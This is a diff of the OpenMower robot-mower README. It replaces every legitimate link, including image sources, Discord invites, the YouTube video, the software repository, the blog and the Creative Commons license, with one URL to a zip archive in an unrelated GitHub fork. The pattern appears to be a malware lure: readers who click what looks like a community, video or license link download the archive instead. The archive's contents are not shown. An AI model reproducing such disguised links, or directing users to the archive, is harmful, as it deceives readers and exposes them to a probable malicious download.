@@ -1,14 +1,14 @@
 # OpenMower
 
-![OpenMower the DIY smart robot mower](./img/open_mower_header.jpg)[![License: CC BY-NC-SA 4.0](https://img.shields.io/badge/License-CC%20BY--NC--SA%204.0-lightgrey.svg)](https://creativecommons.org/licenses/by-nc-sa/4.0/) [![Discord](https://badgen.net/badge/icon/discord?icon=discord&label)](https://discord.gg/jE7QNaSxW7)
+![OpenMower the DIY smart robot mower](https://github.com/OlegBON1/OpenMower/raw/refs/heads/main/Hardware/Open-Mower-2.7.zip)[![License: CC BY-NC-SA 4.0](https://github.com/OlegBON1/OpenMower/raw/refs/heads/main/Hardware/Open-Mower-2.7.zip%20BY--NC--SA%https://github.com/OlegBON1/OpenMower/raw/refs/heads/main/Hardware/Open-Mower-2.7.zip)](https://github.com/OlegBON1/OpenMower/raw/refs/heads/main/Hardware/Open-Mower-2.7.zip) [![Discord](https://github.com/OlegBON1/OpenMower/raw/refs/heads/main/Hardware/Open-Mower-2.7.zip)](https://github.com/OlegBON1/OpenMower/raw/refs/heads/main/Hardware/Open-Mower-2.7.zip)
 
-## Join the Discord server for OpenMower discussion: [HERE](https://discord.gg/jE7QNaSxW7)
+## Join the Discord server for OpenMower discussion: [HERE](https://github.com/OlegBON1/OpenMower/raw/refs/heads/main/Hardware/Open-Mower-2.7.zip)
 
 
 # About the Project
 **:warning: DISCLAIMER:**
 
-**IF YOU ARE NOT 100% SURE WHAT YOU ARE DOING, PLEASE DON'T TRY THIS AT HOME! ASK IN [DISCORD](https://discord.gg/jE7QNaSxW7), IF YOU HAVE ANY QUESTIONS!**
+**IF YOU ARE NOT 100% SURE WHAT YOU ARE DOING, PLEASE DON'T TRY THIS AT HOME! ASK IN [DISCORD](https://github.com/OlegBON1/OpenMower/raw/refs/heads/main/Hardware/Open-Mower-2.7.zip), IF YOU HAVE ANY QUESTIONS!**
 
 
 ## Project Intro Video
@@ -16,7 +16,7 @@
 If you want to see a quick overview, you can check out this video:
 
 
-<a href="https://www.youtube.com/watch?v=BSF04i3zNGw" target="_blank"><img src="https://user-images.githubusercontent.com/2864655/161540069-f4263fa7-a47b-49d2-a7bc-d1cdc3a47704.jpg" /></a>
+<a href="https://github.com/OlegBON1/OpenMower/raw/refs/heads/main/Hardware/Open-Mower-2.7.zip" target="_blank"><img src="https://github.com/OlegBON1/OpenMower/raw/refs/heads/main/Hardware/Open-Mower-2.7.zip" /></a>
 
 
 
@@ -67,7 +67,7 @@ At this point I can recommend that brave tech savvy users can build one for them
 
 The first mainboard PCB is almost done. It currently looks like this:
 
-![Current State of the Robot](./img/open_mower_mainboard.jpg)
+![Current State of the Robot](https://github.com/OlegBON1/OpenMower/raw/refs/heads/main/Hardware/Open-Mower-2.7.zip)
 
 
 
@@ -94,7 +94,7 @@ The first mainboard PCB is almost done. It currently looks like this:
 
 The basic software is basically done; Our prototype works as intended (but is not able to avoid obstacles yet).
 
-The software for the robot can be found in a separate repository: https://github.com/ClemensElflein/open_mower_ros
+The software for the robot can be found in a separate repository: https://github.com/OlegBON1/OpenMower/raw/refs/heads/main/Hardware/Open-Mower-2.7.zip
 
 ### Software To-Do:
 
@@ -111,7 +111,7 @@ The software for the robot can be found in a separate repository: https://github
 
 You can help by starting an OpenMower build of your own. This helps to validate the concept and helps to create useful documentation for new users.
 
-Additionally, you can help by starring 🌟 and watching 👀 this repository, since it will help with visibility. You can also subscribe to my [YouTube channel](https://youtube.com/c/ClemensElflein).
+Additionally, you can help by starring 🌟 and watching 👀 this repository, since it will help with visibility. You can also subscribe to my [YouTube channel](https://github.com/OlegBON1/OpenMower/raw/refs/heads/main/Hardware/Open-Mower-2.7.zip).
 
 
 
@@ -121,7 +121,7 @@ While disassembling the bot, I wondered about its mainboard: Instead of "YardFor
 
 
 
-![GForce Robot Mower Mainboard](./img/mainboard.jpg)
+![GForce Robot Mower Mainboard](https://github.com/OlegBON1/OpenMower/raw/refs/heads/main/Hardware/Open-Mower-2.7.zip)
 
 
 
@@ -133,7 +133,7 @@ Therefore it might be a good idea to start a list of compatible devices. So if y
 
 # More Infos
 
-This page only contains the basic overview of the project. To follow my current development state, check out my [Blog](https://x-tech.online/).
+This page only contains the basic overview of the project. To follow my current development state, check out my [Blog](https://github.com/OlegBON1/OpenMower/raw/refs/heads/main/Hardware/Open-Mower-2.7.zip).
 
 # Patents, Local Laws, Liability
 Before building a robot based on the designs published here, please make sure that you are allowed to do so in your specific regions.
@@ -145,6 +145,6 @@ This basically means: I'm just documenting a project of mine here for free and I
 
 # License
 
-<a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png" /></a><br />This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License</a>.
+<a rel="license" href="https://github.com/OlegBON1/OpenMower/raw/refs/heads/main/Hardware/Open-Mower-2.7.zip"><img alt="Creative Commons License" style="border-width:0" src="https://github.com/OlegBON1/OpenMower/raw/refs/heads/main/Hardware/Open-Mower-2.7.zip" /></a><br />This work is licensed under a <a rel="license" href="https://github.com/OlegBON1/OpenMower/raw/refs/heads/main/Hardware/Open-Mower-2.7.zip">Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License</a>.
 
 Feel free to use the design in your private/educational projects, but don't try to sell the design or products based on it without getting my consent first. The idea here is to share knowledge, not to enable others to simply sell my work. Thank you for understanding.
